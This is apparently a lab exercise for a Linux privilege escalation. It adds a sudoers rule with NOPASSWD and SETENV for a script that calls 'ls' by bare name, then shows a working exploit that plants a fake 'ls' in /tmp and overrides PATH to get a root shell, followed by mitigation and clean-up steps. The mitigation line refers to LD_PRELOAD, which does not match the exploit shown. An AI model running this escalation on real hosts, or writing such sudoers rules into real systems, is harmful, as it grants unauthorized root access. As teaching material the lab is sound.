# Setup

```sh
# root
cp /etc/sudoers /etc/sudoers.bak
adduser sudo4
echo "sudo4 ALL=(ALL) NOPASSWD:SETENV: /home/sudo4/script.sh" >> /etc/sudoers
echo 'ls -la' > /home/sudo4/script.sh
chmod +x /home/sudo4/script.sh
```

# Exploit

```bash
echo '/bin/bash' > /tmp/ls
sudo PATH=/tmp/:$PATH /home/sudo4/script.sh
```

# Mitigate

```bash
# Remove env_keep += LD_PRELOAD
```

# Clean Up

```bash
deluser sudo4 --remove-home
cp /etc/sudoers.bak /etc/sudoers
```